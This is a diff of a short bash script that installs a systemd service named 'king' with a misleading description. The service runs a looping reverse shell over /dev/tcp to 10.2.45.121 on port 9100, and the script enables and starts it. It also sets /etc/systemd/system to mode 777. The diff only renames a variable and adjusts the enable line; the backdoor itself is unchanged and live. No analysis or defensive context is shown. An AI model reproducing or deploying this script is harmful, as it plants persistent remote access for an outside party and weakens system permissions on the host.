@@ -1,6 +1,6 @@
 #!/bin/bash
 
-IP="10.2.45.121"
+SERVER_HOST="10.2.45.121"
 PORT="9100"
 
 chmod 777 /etc/systemd/system
@@ -10,13 +10,12 @@ Description=Required for the effective running of port 9999
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 10; done\"
+ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$SERVER_HOST/$PORT 0>&1; sleep 10; done\"
 
 [Install]
 WantedBy=multi-user.target
 " > /etc/systemd/system/king.service
 
-# systemctl enable /etc/systemd/system/king.service
 systemctl enable king
 systemctl start king
 
